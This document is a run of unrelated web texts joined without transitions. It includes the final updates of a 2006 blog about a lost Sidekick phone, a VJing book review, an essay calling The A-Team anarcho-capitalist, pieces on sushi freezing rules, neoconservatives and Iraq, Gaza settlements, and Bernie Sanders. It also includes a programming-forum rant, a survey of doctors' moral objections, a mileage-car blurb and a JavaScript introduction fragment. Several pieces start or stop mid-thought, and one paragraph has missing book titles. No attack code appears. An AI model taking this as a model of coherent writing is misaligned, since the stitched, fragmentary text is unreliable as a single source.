When I posted this info online , I was informed of the mistake by a anonymous NYPD officer who had read my site .
We met up and he gave me the correct paperwork to fill out and told me that he and his fellow officers agreed with the situation .
So we had to arrange to go again to the police station .
In the mean time , the traffic to my website was insane .
I was uploading upwords of 200 GB a day .
This from a page that was about 100 KB .
I was bleeding money from the page .
I had promised from the beginning that this site was not an attempt to make money , but to do what was morally right .
In this regard , I had not put up any ads or paid links .
I had been offered thousands of dollars to put up as little as one link on the site .
If I had put up an ad , I would have made even more from the millions of hits I was getting .
All this was not something I could live with .
But after losing money from the bandwidth , I decided to put up a Paypal donation link asking only people who could afford it to donate if they wished to help out .
Within a couple hours , I received about $ 1,000 .
Due to some of the negative emails I took down the link .
As well as receiving enough at the time to cover this bandwidth expense , I wanted to try and remain favorable in the general publics views .
Still , though , I was blasted as a fake money making site .
The fact that I had no proof that the police were doing anything was enough to confirm these people ’s views .
After a couple days , my friend and I returned to the police station .
We were told to leave with the “ tails between our legs ” .
When we refused , I was detained for having the paperwork the anonymous officer had supplied me with .
After much arguing , I was told that the law of “ finder ’s keepers , losers weeper ’s ” was in effect .
We were allowed to leave , and I posted this info online .
My readers immediately started a campaign to convince the NYPD to do what was right .
Gordo then emailed me saying that Sasha ’s mother had bought the phone on the subway for $ 100 , and would return it to me for that amount .
This made even less sense .
First they kept changing their story on how they got it .
This version was great .
I mean , who buys a phone from a stanger on the subway for $ 100 ?
The time of a reward was over .
It would have been for doing the right thing .
Holding the phone for ransom was not going to happen .
I was then contacted by a few sources that the family was proceeding with a harassment lawsuit against me .
This seemed far fetched as I had not been contacted with a cease and desist letter as well as all the info I had posted being in the public domain .
I was contacted by numerous lawyers stating that I was in the clear .
Still , there was an alleged law firm trying to make a name for themselves by posting in my forum that I was in the wrong .
All this made for some sleepless nights .
Meanwhile Ivanna ’s wedding was getting closer and closer and since she had not been able to contact the embassy in time , her sister ’s visa was denied .
I tried a last minute gamble and requested that from readers who wanted to help , to please email the embassy for us .
This resulted in me being cc’d in hundreds of emails to the embassy with people requesting that the sister be allowed in the country .
Unfortunately , even though we were in contact with 2 members of Congress who had viewed the site , it was too late for the visa to be made .
The police finally contacted Ivanna after all the public attention and the pressure from the New York Times .
They refused to talk to me , so she supplied them with all the information about Sasha we had gathered .
A couple days later , I was awoken to people calling me saying that my picture and story was on the front page of the Metro Section of the New York Times as well as being on the radio news reports around the world .
On top of that , it made multiple TV nightly news reports as well as on MSNBC .
It turned out that over the weekend , the police had arrested Sasha and gotten the Sidekick back for us .
As Ivanna had already bought a new Sidekick , there was no need for an additional one .
We decided to sell the Sidekick on Ebay .
1/3 of the total to her , 1/ 3 to me , and 1/3 to a charity for helping single mothers and children .
I also contacted T - Mobile and they generously offered to donate the total amount of the winning bid , up to $ 5,000 .
I would cover the taxes as well as the cost of the auction out of my own percentage .
I had never sold anything on Ebay , and put up a auction for the Sidekick , without the proper paperwork for the charity .
After over 10,000 views in less than a day and over $ 1,000 bid , Ebay removed the auction because of the lacking paperwork .
About a day later , I reposted a new auction with all the correct paperwork .
This time , the response was a bit slower .
After 7 days though , there were over 40,000 views and the winning bid came out to $ 3,600 .
Unfortunately , the winning bidder turned out to be fake .
This is particularly in poor taste as for costing the charity needed money .
Any attempts to contact the remaining bidders with “ second chance offers ” was blocked by Ebay because my account was new .
They also blocked numerous viewers from my site from contacting them .
This was particularly puzzling as multiple spammers were successful in contacting the bidders offering them fake Sidekicks allegedly from my site , as well as fake “ second chance offers ” .
What is happening now :
Update # 70 July 30 , 2006 3:00 p.m.
I have attempted to send the second chance offer to multiple lower bidders , but as they are never informed via email , they see the auction on their “ My Ebay ” page too late to respond .
As the “ 15 minutes ” of attention this site has received is over , I will not post another auction .
I am still offering the Sidekick up for sale privately .
Contact me at the email address below if interested .
I will honor the same percentage to Ivanna and the charity as promised in the auction .
I have no further news at the moment on what is Sasha ’s status .
Ivanna is in Europe on her honeymoon .
She is also introducing her husband to her sister .
As the police wo n’t speak with me directly , I will not know what the DA is planning to do until Ivanna comes back .
In the same regard , I have no knowledge of the military ’s response to her brother ’s conduct .
I was directly contacted by his superiors but have no heard back .
As for what I am planning to do with this website , I have decided to leave this page up .
I will also leave a link below to the original page .
I have blacked out Sasha and the other pics , as I feel that justice has been served .
I hope that she has learned to do the right thing from now on if not for her sake , then her baby ’s sake as well .
Update # 71 January 10th , 2007 11:00 a.m. Wow ...
It 's been a long time since my last update .
Yet , I still am getting 20 - 50 mails STILL a day from people asking me for updates , what I ’ve done with the Sidekick , what 's happened to Sasha , what am I doing now ...
Well ...
My friend Ivanna is happily married .
We recently filmed a segment on 20/20 about the whole internet experience .
It should air Feb. 9th .
( I will keep you updated ) .
We have no idea what happened to Sasha ...
We never pressed charges .
We were satisfied getting the Sidekick back and felt that enough attention had been brought to her , and hopefully she has learned her lesson .
And the Sidekick ....
We gave up on the Ebay auction ( I will never use Ebay again ) and offered it directly over this site .
In the end , we raised over $ 2.000 for charity .
I will post a copy of the paperwork when I get it .
And no , we did n't take any percentage off for ourselves .
As for me ..
Will I ever do something like this ??
HELL NO !
This took up way too much of my time , too many expenses , too much harassment .
I have been hired by a sapphire company ...
http://www.TheNaturalSapphireCompany.com doing SEO and PR work fulltime .
I do things like sending out press releases ... such as us obtaining the US ' largest natural blue sapphire .
It 's a great company and the publicity surrounding this site helped me get the opportunity to work there .
Update # 72 February 9th , 2007 3:00 p.m. BIG NEWS .
So , tonight ABC will air Ivanna and my interview on 20/20 ( the show starts at 9 p.m. ) .
I 'm very excited and hope you can view it .
As for those finding out about this site for the first time ...
Where have you been ????
On another note , I finally got the paperwork from the charity .
I again want to thank the private donor and T - Mobile for being so generous .

Donation Button :
I have decided to put back up a donation button .
I still am incurring expenses for this website .
I also have put in numerous hours upon hours making updates .
As I have stated previously , I could have made hundreds of thousands of dollars from ad and link revenue from this site .
The purpose though was NOT to make money .
Any donations would just cover operating expenses .
Please note that my Paypal will accepts direct Paypal transfers as well as credit cards .
As before , I ask only those who are capable and willing to donate to do so .
If you chose not to , I still appreciate the time that you took to read my page .

Not so much a book as an visual experience , its lavishly illustrated 191 full colour pages are , quite simply , art , each one providing a unique visual window into the world of VJing .
Kicking off by tracing the roots of VJing , the book manages , in a few short and unpretentious pages , to namecheck everyone from Eadweard Muybridge , the Lumiere brothers , Melies , Eisenstein , Fritz Lang , Luis Bunuel and Kandinsky , to Warhol , Pink Floyd and Aphex Twin … though it does stop short of discussing the relevance of aboriginal cave paintings to the VJing scene ( I ’ll save it for the PhD… ) .
This is quickly followed by several features dealing with various aspects of VJ culture , after which the book presents 150 interviews with 149 of the world ’s best VJs ( I ’m not included ) .
Grouped by geographical region , each set of interviews opens with a brief intro to the VJing scene in that region .
Rounding things off are fourteen pages of info about VJing software , hardware and setups .
Included free is a 130 minute DVD featuring exclusive performances & films from , amongst others , Coldcut +
Hexstatic , The Light Surgeons , D Fuse , Elliot Earls , UVA , & Scanner .
If there ’s one criticism , it ’s that some of the interviews and the how to section could have been more in depth … though , if they had been , the book would probably have ended up three times the size and four times its excellent value price of UKP 25 … or just UKP 16.50 on Amazon !
As things stand , there ’s more than enough to whet your appetite , in fact to leave you drooling , as every page is jam packed with stunning images that will inspire your visuals and text that will give you ‘ nuff ideas for getting bookings and lots more besides .
So whether you ’re a professional VJ or a complete newbie , buy this book , as it provides the best and most comprehensive overview of the art of VJing … and the art of VJing .

Moral Rights Asserted .
" The A - team " supports the idea of natural law , rejects the nominalist tradition , rejects relativism both on ethical and epistemological grounds , supports entrepreneurship and free market , praises division of labor and monetary economy , builds its morality on the nonaggression axiom , rejects the necessity for economic regulation , undermines the government itself by demonstration of its failures , and shows how society is shaped by human action .
The " A " in the praised TV series probably stands for anarcho - capitalist .
The A - team does not respect positive law , since this statist invention is responsible for their plight .
However , the whole series is built on the idea that there are easily recognizable ethical values that cannot be questioned by any human being , even by the state itself .
There is no moral relativism , or epistemological relativism , for we exactly know what is right and what is wrong , and our intellect grants us the ability to recognize it .
No verdict , no bill , or no general 's will can change that fact .
Official institutions can only obscure the nature of things , and nobody has a power to change them .
This clearly corresponds to the idea of natural law , so greatly expressed by Bastiat - positive law that denies natural law can have only one consequence : law perverted .
Hence the A - team believes rightly that there are universal and never changing ethical values , which should be respected at any time by anyone .
First of all , the A - team is an illegal , anti-government , underground organization of people who escaped from prison .
They are outlaws , surely pay no taxes , and , in most episodes , the US army is chasing them .
Are these guys a band of thugs ?
Not at all .
They are portrayed as positive heroes and the government apparatus is portrayed as the institution that unjustly tries to imprison them .
One of the most famous sentences from the theme is the reference to a " crime they did n't commit . "
During the Vietnam
War these soldiers were ordered by their colonel to rob a bank .
After they finished their job , they found out that their headquarters were destroyed .
It was impossible for them to prove that they acted as the colonel told them to .
The US government , then , decided to prosecute them for the crime .
Here we have another great example how positive law perverts the natural law .
When the individuals acting on their own do something wrong , it is considered a " crime " .
But if the government engages in such a behavior , then suddenly " crime " is out of a picture .
One of the famous examples is of course taxation .
The state takes over people 's income without their consent , but if some private individual takes someone 's money without consent , he is considered a " criminal " .
This is a classic example of verbal law production and a Hobbesian belief that will can change or create law .
The whole philosophy of the A - team boils down to an axiom of non-aggression .
They never initiate a conquest on someone else 's property , no matter what profits that would create .
They also never defend true aggressors .
Instead the people against whom aggression was initiated always employ them .
This feature is completely essential for them to take any challenge .
In the episodes they engage in entrepreneurial analysis to find out what is happening , who is responsible for what , and how the aggression was started .
Moreover , the A - team is of course acting with the consent of the persons who were attacked -- unlike the state , which grants to itself a right to decide for somebody to defend him .
Clearly the A - team is an example of an anarchistic creativity , but certainly of the capitalist version , not the leftist one .
The crew 's actions are based on the advanced division of labor - it concerns both the internal organization , and the external , since the A - team obviously uses the external market in order to achieve its results .
The clients are mostly people who are not good in the production of security , but instead devote their time to producing something else .
With earned income they hire people with comparative advantage , the A - team , to protect their rightful property and lives .
The A - team is a type of anarchist , anti-leftist , organization that relies on economic calculation .
In a sense the A - team is a beneficial , efficiently organized firm , which has prices for its inputs and outputs .
Every production process requires money capital so the necessary factors of production are bought ( guns , oil , people hired , and other resources ) .
In order for the whole process to be profitable the A - team naturally prices their product : the production of security .
So forget the idea that it has anything to do with leftist anarchism .
This production of security is organized on a completely commercial basis .
All economic goods are scarce , so one has to pay a price for them .
The anarchism of the A - team is clearly an Austrian type , not the neoclassical .
Of course goods produced by them are priced , as any other useful service .
It does not mean that at any times in any place the A - team is acting like a neoclassical firm owner , searching only for the lowest inputs and the highest revenues .
As is mostly the case with real capitalists , the A - team sometimes offers its services for a lower price or even on a charitable basis .
Hence we see that the crew is a clear example of homo agens , choosing means and ends , not homo economicus , automatically responding to price spreads .
In other words , although economic calculation is essential to their proper functioning , there are limits to that calculation .
Certain things are valued without reference to market prices .
A - team successes are amazing despite the fact that the government has outlawed them .
Moreover , they are not only haunted by the official law , but what is even more inspiring , they are a completely unregulated organization .
Think about it - they got no permission from the government to act , no government official is subjecting them to an official statist control , they have no accounting books and no lawyers , they do not have to explain themselves or report to any politician .
They just do their job by producing and supplying the goods that are demanded by peaceful individuals .
And guess what ?
Without the government regulation their achievements are unbelievable .
The A - team proves also that the so called ' free rider ' , or maybe in their case ' positive external effects ' , is completely irrelevant for the production of security .
Statist theory claims that the production of security should be supplied by compulsory monopolistic measures since all the people benefit from them but cannot be excluded if they decide not to pay .
In the A - team there is no problem with that .
Of course there are certain individuals who will benefit from their actions despite the fact that they wo n't pay a penny .
Any security agency is doing a favor to a person respecting property rights even though not every single person of that kind pays that agency .
This , however , does not change the fact that the A - team works properly on the voluntary basis and finds its customers without monopolized use of force .
They can successfully find the clients without making their services compulsory .
To many food lovers , sushi has become a near religion , and a cornerstone of the faith is that the fish is extraordinarily fresh .
Its priests are chefs with seemingly mystical abilities to summon fresh fish from all corners of the globe .
But because of health concerns and growing demand , 50 to 60 percent of sushi in the United States is frozen at some point in its journey from the ocean , according to wholesalers .
And rare is the sushi restaurant that tells customers upfront that they may be eating fish that has been in deep freeze for up to two years .
Most would be even more surprised to learn that if the sushi has not been frozen , it is illegal to serve it in the United States .
Food and Drug Administration regulations stipulate that fish to be eaten raw -- whether as sushi , sashimi , seviche , or tartare -- must be frozen first , to kill parasites .
'' I would desperately hope that all the sushi we eat is frozen , '' said George Hoskin , a director of the agency 's Office of Seafood .
Tuna , a deep - sea fish with exceptionally clean flesh , is the only exception to the rule .
THE NEOCON REHABILITATION PROJECT ….
David Rose ’s Vanity
Fair interview with the neocon elite is getting plenty of well - deserved attention this weekend .
For one thing , it ’s fun to play the “ which quote is the most damning ? ” game .
Is it Michael Ledeen ( the most powerful people in the White House are “ women who are in love with the president ” ) ?
Kenneth Adelman
( “ They turned out to be among the most incompetent teams in the post - war era ” ) ?
David Frum ( George Bush “ just did not absorb the ideas ” ) ?
But that can wait .
A few months ago I noted in passing that it was only a matter of time before the neocon hawks began claiming , like old - time Trotskyists , that there was nothing wrong with their ideas , only with the fools who had bungled their execution .
Richard Perle states this the most directly :
Huge mistakes were made , and I want to be very clear on this :
They were not made by neoconservatives , who had almost no voice in what happened , and certainly almost no voice in what happened after the downfall of the regime in Baghdad .
I ’m getting damn tired of being described as an architect of the war .
I was in favor of bringing down Saddam .
Nobody said , ‘ Go design the campaign to do that . ’
I had no responsibility for that .
It ’s worth saying very plainly what ’s going on here : the neocons are using these interviews to make the case that neoconservatism is in no way to blame for the disaster in Iraq .
If they had been in charge things would have been different .
This baby needs to be strangled in its crib .
The 1997 “ Statement of Principles ” of the Project for a New American Century , the neocon Bible , was signed by , among others , Dick Cheney , Donald Rumsfeld , Paul Wolfowitz , Zalmay Khalilzad , Scooter Libby , and Elliot Abrams .
All of these men were deeply involved in the formulation , planning , and execution of the Iraq war .
The neocon creed was part and parcel of every move they made .
What ’s more , despite their conveniently - timed hand wringing about incompetent execution , there ’s little evidence that the apologists would have done anything very different ?
in fact , little evidence that they cared very much about anything beyond “ bringing down Saddam . ”
Rather , neocons have always been focused on conventional military power , and plenty of it , primarily aimed at potential enemies like China .
( Despite the revisionist history spit out now and again by their supporters , terrorism simply was n’t a major neocon focus prior to 9/11 . )
But conventional military power was n’t the problem in Iraq .
The problem was in the occupation , an area that neocons have never cared a fig about .
Peacekeeping forces ?
Nation building ?
Multilateral legitimacy ?
Language and cultural training ?
Counterinsurgency ?
Economic engagement ?
It ’s easy to cherry - pick the neocon archives to find bits and pieces where they talked up some of this stuff .
But their overall focus has always been on the use of overwhelming force and intimidation , with a sideline in democracy promotion rooted more in fantasy than in a hard look at what it takes to actually make democracy take root in a region with none of the economic or institutional infrastructure to support it .
Anybody with ground - level experience in nation building could have explained the problems , but they did n’t want to listen .
A sufficient show of force was supposed to be enough to make democracy flower .
The neocons have always been idealists , and their ideals saw full flower in the Iraq war .
A show of force in one country , plenty of threats against its neighbors , a disdain for multilateral action , and an occupation designed to be a showpiece of conservative ideology rather than a serious attempt at reconstructing a society .
That ’s what the neocons wanted , and that ’s what they got .
The rest is details .
The failure of Iraq is inherent in the naive idealism and fixated ideology of neoconservatism , and shame on us if we let them get away with suggesting otherwise .
This is one rehabilitation project that needs to be stopped dead in its tracks .

Gaza and the Israeli Settlers
It 's got to be one of the most miserably unimportant places in the world , the Gaza Strip .
A bone dry desert by nature , packed with people in the Muslim cities , here and there dotted with patches of green where irrigation has brought relief , it lacks any resources that should make it important to anyone , anywhere .
Except , of course , to the people who live there .
So why has it been in the news ?
Why are weeping people being forced to evacuate their homes ?
The Gaza Strip matters because its people are mostly Muslim -- and once the evacuation of the Jewish settlements is completed , it will be completely Muslim .
From one point of view , the Gaza Strip is a dagger pointed at the heart of a fragile Israel .
From another point of view , it is tiny , powerless land being crushed under the weight of mighty Israel .
How Gaza Is Exploited
Before the June War of 1967 , when Gaza was administered by Egypt , it really was a dagger that put Egyptian weapons within seemingly easy reach of Israel 's major cities .
Since then -- especially after Anwar Sadat and Menachem Begin brought peace between Egypt and Israel -- Gaza has been powerless .
Now and then terrorists based there succeed in killing somebody -- often visitors from outside trying to bring some of the benefits of civilization to the people of the Gaza Strip , like the American diplomats who were murdered there a couple of years ago .
But in terms of posing any kind of danger to Israel , Gaza 's only weapon that has meant anything for many years is this :
Propaganda value .
Nowhere are Muslim Palestinians more packed - in , poor , and miserable - looking .
They look great on camera -- if you want to illustrate the suffering of the Palestinians under the rule of the Israeli oppressors .
Never mind that the reason the borders closed and Gazans lost their jobs was because their jobs were in Israel , and Israel had to close the borders to protect themselves from murderous terrorists who crossed the border along with innocent Gazans going to work .
The sadder the lot of the people of Gaza , the worse Israel could be made to look elsewhere in the world -- in Europe and America , for instance , where people are generally unaware that the obvious misery of the people of Gaza is n't actually that different .
The truth is that the Palestinian people have been kept isolated and poor from the beginning -- by fellow Muslims .
The refugees from the 1948 war could have been assimilated into the countries that took them in -- but they were forced to stay in camps , where their poverty could be used as propaganda against Israel .
Give Me Land , Lots of Land
Ironically , it was Israel 's conquest of the West Bank and Gaza Strip that opened the door to the existence of an independent Palestinian state .
By cutting these territories off from Jordan and Egypt , Israel allowed them to create a separate national identity in a clearly identifiable territory .
The trouble was that to some Israelis , the conquest of these territories was not just about establishing defensible boundaries to avoid further attempts by Arab Muslim states to conquer Israel .
They saw these territories as an integral and permanent part of Israel , where Israelis should be able to buy ( or take ) land and establish settlements .
Some saw it as the will of God , restoring to Israel much of the inheritance bestowed by God in Torah .
Others saw it as Israel 's right , by long - established international law and custom , to regard territory conquered in a defensive war as its own property , paid for in blood .
It was about religion for some , about land for others -- but regardless of the motive , there were Israelis eager to establish Jewish settlements on land that Palestinians saw as their own .
( Never mind that many Palestinians see all of Israel as " their own . " )
There were far more Israelis who did not actually join the settlements , but supported them politically .
As Palestinians raised an increasing hue and cry internationally against Israeli settlements , within Israel there was such a powerful movement in support of the settlements that it became politically impossible for anyone to block the settlement movement , let alone roll it back .
When Israeli governments tried moratoria or limits on settlements , there would be settlers -- squatters , really -- eager to defy the law and settle when and where they were forbidden .
And even the lawbreakers had substantial political support .
So Why Are Settlements Being Evacuated ?
The pro-settlement folks are n't the only people in Israel .
A much larger group is sick of war , tired of the anti-Israeli propaganda throughout the world , and eager to trade land for peace .
The idea is that if a fully demilitarized Palestine came into existence , then Arabs could misgovern each other to their hearts ' content .
If they started to build up a dangerous army , the Israeli military would move in and destroy it .
But as long as they kept their noses clean , the Palestinians could have their independent state .
Most Israelis understand that many Palestinians are just as sick of war as they are .
They hoped -- or wished -- that once Israeli occupation ended , then so would the Intifadeh .
Yasser Arafat -- the worst enemy the Palestinian people ever had -- turned down a chance to get most of the Palestinian land and instead launched a pointless war of murder in order to get ...
What ?
Nobody knows .
So the Palestinians -- or at least Hamas and other terrorist organizations -- continue a war whose goal is either genocide against Israel or ... or no discernible goal at all , since they could easily have political independence now if they 'd just stop killing Jews .
The Israeli government , then , has to deal with the fact that peaceful Palestinians are unable to control their murderous brethren ( for the obvious reason that if a Palestinian openly opposes the murder campaign he 'll be murdered ) .
So if Israel is to have any kind of peace or security in the long term , they not only have to seal off the border between them and their would - be killers , but they also need to immunize themselves against international opprobrium .
In other words , they need to fight the propaganda war , as well as the on - the - ground physical war against their enemies .
Sharon's Gamble
Ariel Sharon understands this , and he 's making a bold play to defuse the anti-Jewish , anti-Israel hatred that has swept through " intellectual " Europe and America in recent years .
By removing Jewish settlements from Gaza , Sharon is proving that Israel will act in good faith to restore Palestinian territory .
Analyzed one way , it 's a no-lose proposition .
Either the Palestinians will grow up and govern themselves sanely , no longer allowing Gaza to be a staging area for murderous attacks on Israel ... or they wo n't .
If they do maintain the peace , then Israel 's trade was a good one .
They would then have a sound basis for trading more land for peace on the West Bank .
But if -- as everyone expects -- Hamas and other murderers persist in using Gaza as a staging area for missile attacks and terrorist assaults against Israel , then Israel has proof that nothing they concede to the Palestinians will lead to any good end .
Therefore Israel can hold onto rational world opinion , having seized the high ground and proven that the Palestinians are not ready to abide by international law .
On the other hand , to the Palestinian diehards , Sharon 's action will doubtless be seen as a sign of weakness , and the murderers will tell each other that if they just keep killing Jews , they can get it all back .
But that attitude -- and those actions -- will play into Israel 's hands .
Because nobody with any moral sense would expect Israel to concede another inch of territory when it clearly does not lead to peace .
It 's a demonstration , then .
And those pictures of weeping Israeli settlers being forced from their homes are every bit as good a propaganda tool for Israel as those poor suffering Palestinians have long been for the other side .
It would n't really have been half so effective if all the settlers had left peacefully .
The world needed to see Israeli troops forcing the settlers to leave .
They needed to show how much pain was involved .
How much it cost .
How serious the Israeli government was about sacrificing for peace .
That 's why Sharon took the enormous political risk of alienating his own core supporters by dismantling settlements .
He 's playing longball here , hitting for the fence instead of bunting .
He may lose his position at the head of Likud .
But he knows that whoever his successor is will not be able to roll back this change and reestablish the settlements .
Sharon is willing to risk ending his own career for real and important benefits to Israel over the long term .
That 's how I define " Statesman . "

Pounding A Nail : Old Shoe or Glass Bottle ?
Wednesday , May 25 , 2005
" A client has asked me to build and install a custom shelving system .
I 'm at the point where I need to nail it , but I 'm not sure what to use to pound the nails in .
Should I use an old shoe or a glass bottle ?
How would you answer the question ?
a) It depends .
If you are looking to pound a small ( 20 lb ) nail in something like drywall , you 'll find it much easier to use the bottle , especially if the shoe is dirty .
However , if you are trying to drive a heavy nail into some wood , go with the shoe : the bottle with shatter in your hand .
b)
There is something fundamentally wrong with the way you are building ; you need to use real tools .
Yes , it may involve a trip to the toolbox ( or even to the hardware store ) , but doing it the right way is going to save a lot of time , money , and aggravation through the lifecycle of your product .
You need to stop building things for money until you understand the basics of construction .
I would hope that just about any sane person would choose something close to ( b ) .
Sure , it may seem a bit harsh , but think about it from the customer prospective : how would you feel if your carpenter asked such a question ?
I find it a bit disturbing , however , that this attitude is not prevalent in software development .
In fact , from what I can tell , it seems to be discouraged .
I 've been participating in Usenet / forums / lists for a decade now , asking programming questions and helping out others who have questions of their own .
If some one asks a question that demonstrates the complete absurdity of their design , I 'll generally reply with my ( quite candid ) opinion on their design .
To give you an idea what I 'm talking about , here 's something I remember seeing a while back ( from memory ) .
Subject : Aggregates Help
I have a table that stores test results for milling machines .
Each test consists of N - runs conducted by a measurer going M - trials each .
I have this information represented in a varchar column in the following format : " 44:1,5,4;23:2,4,9;14:1,4,3 " .
When the column is read into the class , it is converted into a jagged array : ( ( 44 , ( 1,5,4 ) ) , ( 23 , ( 2,4,9 ) ) , ( 14 , ( 1,4,3 ) ) ) of runs ( 3 of them ) and measurers ( Ids of 44,23,14 ) and trials ( 1,5,4 and 2,4,9 and 1,4,3 ) .
One of the reports I have is a deficiency report , which predicts which machines may fail .
To run this , I have a report class that loads up the appropriate tests and processes the information .
However , this is taking longer and longer to run .
I 'm thinking that running it in a stored procedure will be quicker .
I can figure out how to get an " array " in SQL with a table variable , but how do I make a jagged array ?
Any ideas ?
Some of the folks on in the list took it as a fun challenge , going back and forth with how deficiencies are calculated , and providing some incredibly brilliant ways of solving this problem .
Not I , though .
My response was something to the effect of …
This is quite possibly the worst way you could store this data in a database .
No , seriously .
They had better ways of doing this over thirty years ago .
You have created a horrible problem that is only starting to rear its ugly head .
It will only continue to get horribly worse , costing your company more and more money to maintain .
You need to drop everything your doing right now and take a trip to your bookstore to get a database book .
I recommend INTRODUCTION TO DATABASE SYSTEMS by DATE , but at this point anything should do .
For the sake of everyone who will maintain your future code , do n't touch a database until you understand how big of a mess you 've created .
How do you think you would have responded to that post ?
Would you have taken the challenge to think about how to solve the problem or just take the opportunity to school the poster ?
If you say the former , then you probably think I 'm a grumpy curmudgeon ( more likely , less family - friendly words though ) .
My appeal to you is to think back to the carpenter .
How is this any different ?
How fair is this to person paying him to develop software , or , more importantly , the poor sap that will have to come in and not only understand the mess , but maintain it .
That poor sap could be you one day !
If you say you 'd go with the latter , harsher reply , then I ask , why are n't you out there participating in the newsgroups / forums / lists ?
We need more people like you out there : there are too many of the people who tell people exactly how to apply the duct tape without giving the poster a firm scolding .
But I think the problem is worse than not having enough grumpy curmudgeons : in my experience , forum moderators actively delete critical posts that do n't solve the problem , keeping only the hacks that solve the hacks .
When new users come to read the posts in the future , they may actually think , " hey , I could use this to solve my problem . "
Am I on the wrong side in this ?
Should we actively be encouraging new programmers to use their horrific techniques ?
Or am I just looking at this the totally wrong way ?
We described Bernie Sanders as Vermont 's only congressman in the article below .
He is the state 's only member of the House of Representatives , but it has two senators , who are also congressmen .
Amid the furious debate over Iraq and the speculation that George Bush may be a lame duck after next Tuesday 's mid-term elections , an extraordinary political milestone is approaching : a cantankerous 65 - year - old called Bernie looks set to become the first socialist senator in US history .
Bernie Sanders is so far ahead in the contest for Vermont 's vacant seat for the US Senate that it seems only sudden illness or accident could derail his rendezvous with destiny , after eight terms as the state 's only congressman .
His success flies in the face of all the conventional wisdom about American politics .
He is an unapologetic socialist and proud of it .
Even his admirers admit that he lacks social skills , and he tends to speak in tirades .
Yet that has not stopped him winning eight consecutive elections to the US House of Representatives .
" Twenty years ago when people here thought about socialism they were thinking about the Soviet Union , about Albania , " Mr Sanders told the Guardian in a telephone interview from the campaign trail .
" Now they think about Scandinavia .
In Vermont people understand I 'm talking about democratic socialism . "
Democratic socialism , however , has hardly proved to be a vote - winning formula in a country where even the word " liberal " is generally treated as an insult .
Until now the best showing in a Senate race by a socialist of any stripe was in 1930 by Emil Seidel , who won 6 % of the vote .
John McLaughry , the head of a free - market Vermont thinktank , the Ethan Allen Institute , said Mr Sanders is a throwback to that era .
" Bernie Sanders is an unreconstructed 1930s socialist and proud of it .
He 's a skilful demagogue who casts every issue in that framework , a master practitioner of class warfare . "
When Mr Sanders , a penniless but eloquent import from New York , got himself elected mayor of Burlington in 1981 , at the height of the cold war , it rang some alarm bells .
" I had to persuade the air force base across the lake that Bernie 's rise did n't mean there was a communist takeover of Burlington , " recalled Garrison Nelson , a politics professor at the University of Vermont who has known him since the 1970s .
" He used to sleep on the couch of a friend of mine , walking about town with no work , " Prof Nelson said .
" Bernie really is a subject for political anthropology .
He has no political party .
He has never been called charming .
He has no money , and none of the resources we normally associate with success .
However , he learned how to speak to a significant part of the disaffected population of Vermont . "
Mr Sanders turned out to be a success as mayor , rejuvenating the city government and rehabilitating Burlington 's depressed waterfront on Lake Champlain while ensuring that it was not gentrified beyond the reach of ordinary local people .
" He stood this town on its ear , " said Peter Freyne , a local journalist .
" I tried to make the government work for working people , and not just for corporations , and on that basis I was elected to Congress , " Mr Sanders said .
He has served 16 years in the House of Representatives , a lonely voice since the Republican takeover in 1994 .
He has however struck some interesting cross-party deals , siding with libertarian Republicans to oppose a clause in the Patriot Act which allowed the FBI to find out what books Americans borrowed from libraries .
He says his consistent electoral success reflects the widespread discontent with rising inequality , deepening poverty and dwindling access to affordable healthcare in the US .
" People realise there is a lot to be learned from the democratic socialist models in northern Europe , " Mr Sanders said .
" The untold story here is the degree to which the middle class is shrinking and the gap between rich and poor is widening .
It is a disgrace that the US has the highest rate of childhood poverty of any industrialised country on earth .
Iraq is important , but it 's not the only issue . "
In a state of just over 600,000 people he also has a significant advantage over his Republican opponent , Rich Tarrant , a businessman who has spent about $ 7 m on his campaign .
" Sanders is popular because even if you disagree with him you know where he stands , " said Eric Davis , a political scientist at Vermont 's Middlebury College .
" He pays attention to his political base .
He 's independent and iconoclastic and Vermonters like that . "

My son just turned two , and we have begun to teach him the foundations of ethical behavior .
To aid us in this endeavor , we purchased a number of books by Elizabeth Verdick : , and Those four volumes might have been enough for the 20th century child .
But these days there is at least one more fundamental tenet of ethical behavior that must be drilled into our nation ’s youth as early as possible .
And so I have taken it upon myself to pen the latest installment in theseries .
TRENTON , N.J. --
A significant number of doctors say they do not feel obligated to tell patients about medical options they oppose morally , such as abortion and teen birth control , and believe they have no duty to refer people elsewhere for such treatments , researchers say .
The survey of 1,144 doctors around the country is the first major look at how physicians ' religious or moral beliefs might affect patient care .
The study , conducted by University of Chicago researchers , found that 86 percent of those responding believe doctors are obligated to present all treatment options , and 71 percent believe they must refer patients to another doctor for treatments they oppose .
Slightly more than half the rest said they had no such obligation ; the others were undecided .
" That means that there are a lot of physicians out there who are not , in fact , doing the right thing , " said David Magnus , director of Stanford University 's Center for Biomedical Ethics .
An American Medical Association policy statement says doctors can decline to give a treatment sought by an individual that is " incompatible with the physician 's personal , religious , or moral beliefs . "
But the physician should try to ensure the patient has " access to adequate healthcare . "
The survey did not examine whether these doctors act on their beliefs -- that is , whether they actually withhold information or refuse to refer patients .
But the researchers calculated that tens of millions of Americans might be going to such doctors .
" Conscientious objection is fine . . . as long as it does n't conflict with the rights of the patient , " Magnus said .
" You can't abandon the patient or essentially coerce the patient by saying you wo n't do the procedure or refer them to someone else . "
The study , which was partially funded by the Robert Wood Johnson Foundation of Plainsboro , N.J. , is published in today 's New England Journal of Medicine .
It was led by Dr. Farr Curlin , a University of Chicago ethicist and internist .
The findings were based on a survey mailed to 1,820 practicing US family doctors and specialists , chosen randomly from a national database ; 63 percent responded .
Doctors who described themselves as very religious , particularly Protestants and Catholics , were much less likely than others to feel obligated to tell patients about controversial treatments or refer them to other doctors , and were far more likely to tell patients if they had moral objections .
Overall , 52 percent of those responding said they oppose abortion , 42 percent opposed prescribing birth control to 14 - to 16 - year - olds without parental approval , and 17 percent objected to sedating patients near death .
Female doctors were much more likely than male ones to feel obligated to refer patients for treatments they personally oppose , far less likely to present their own objections to a patient , and slightly more likely to disclose all treatment options .

We like to ooo and ahh over gadget -y cars like the Honda Civic Hybrid and Toyota Prius , especially when rumors swirl about turbocharged engines getting 100 miles per gallon .
But then we saw this winner of the SAE Super Mileage Competition , a car which racked up a jaw - dropping 3145 miles per gallon .
This is a particularly amazing feat , because it 's nearly twice as efficient as its predecessor : the same Canadian team won the competition last year with a 1600 mpg car .

Introduction
JavaScript ’s increasing popularity throughout the web makes it more important than ever to make sure our client side code is implemented with a nice mix of stability , speed , and reusability .
